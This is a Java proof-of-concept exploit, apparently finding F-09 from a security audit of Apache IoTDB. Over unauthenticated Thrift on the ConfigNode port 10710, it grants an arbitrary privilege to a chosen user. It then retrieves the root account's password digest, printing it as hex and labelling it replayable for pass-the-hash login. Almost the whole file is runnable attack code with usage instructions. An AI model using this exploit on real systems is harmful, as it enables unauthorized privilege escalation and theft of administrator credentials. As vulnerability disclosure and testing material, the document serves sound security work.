import org.apache.iotdb.confignode.rpc.thrift.*;
import org.apache.iotdb.common.rpc.thrift.TSStatus;
import org.apache.iotdb.commons.auth.entity.PrivilegeType;
import org.apache.iotdb.db.queryengine.plan.statement.AuthorType;
import org.apache.thrift.protocol.TBinaryProtocol;
import org.apache.thrift.transport.TSocket;
import org.apache.thrift.transport.TTransport;
import org.apache.thrift.transport.layered.TFramedTransport;
import java.nio.ByteBuffer;
import java.util.HashSet;
import java.util.Set;

/**
 * F-09 — Unauthenticated privilege grant + password-digest disclosure via the ConfigNode
 *        internal RPC (port 10710).
 *
 * IConfigNodeRPCService authenticates no peer. ConfigNodeRPCServiceProcessor.operatePermission
 * (:640) builds an AuthorTreePlan and executes it with no caller check; getUser(name) (:1557)
 * returns the account's full permission set INCLUDING the stored password digest, which can be
 * replayed via the encrypted-password login mode (see F-14).
 *
 * CONDITIONAL on reachability of port 10710 (see F-04 note). Password-independent.
 *
 * Usage: java F09_ConfigNodeGrant <host> <10710> <targetUser> [privilege e.g. MANAGE_ROLE]
 */
public class F09_ConfigNodeGrant {
  public static void main(String[] a) throws Exception {
    String host = a.length > 0 ? a[0] : "127.0.0.1";
    int port    = a.length > 1 ? Integer.parseInt(a[1]) : 10710;
    String user = a.length > 2 ? a[2] : "lowpriv";
    String priv = a.length > 3 ? a[3] : "MANAGE_ROLE";

    System.out.println("[F-09] " + Common.ts() + "  target=" + host + ":" + port
        + "  (raw Thrift, NO session, NO credentials)");
    TTransport tr = new TFramedTransport(new TSocket(host, port));
    tr.open();
    IConfigNodeRPCService.Client c = new IConfigNodeRPCService.Client(new TBinaryProtocol(tr));

    Set<Integer> perms = new HashSet<>();
    perms.add(PrivilegeType.valueOf(priv).ordinal());
    TAuthorizerReq req = new TAuthorizerReq(
        AuthorType.GRANT_USER.ordinal(), user, "", "", "", perms, false,
        ByteBuffer.wrap(new byte[]{0, 0, 0, 0}), -1L, "");
    TSStatus st = c.operatePermission(req);
    System.out.println("[F-09] operatePermission GRANT_USER(" + priv + " -> " + user + ") -> " + Common.code(st));

    TPermissionInfoResp ur = c.getUser("root");
    System.out.println("[F-09] getUser('root')                -> code=" + ur.getStatus().getCode());
    if (ur.getUserInfo() != null) {
      TUserResp u = ur.getUserInfo();
      System.out.println("[F-09]   root permission set + password digest disclosed unauthenticated:");
      System.out.println("[F-09]   name=" + u.getPermissionInfo().getName()
          + " sysPriSet=" + u.getPermissionInfo().getSysPriSet());
      // Render the stored password digest as hex (raw bytes would corrupt a text transcript).
      String pw = u.getPassword();
      StringBuilder hex = new StringBuilder();
      if (pw != null) for (byte b : pw.getBytes("ISO-8859-1")) hex.append(String.format("%02x", b));
      System.out.println("[F-09]   password_digest(hex)=" + hex
          + "   <- replayable via the encrypted-password login mode (pass-the-hash, see F-14)");
    }
    System.out.println("[F-09] " + Common.ts()
        + "  If grant code=200, verify with `LIST PRIVILEGES OF USER " + user + "` (run-all.sh does this).");
  }
}
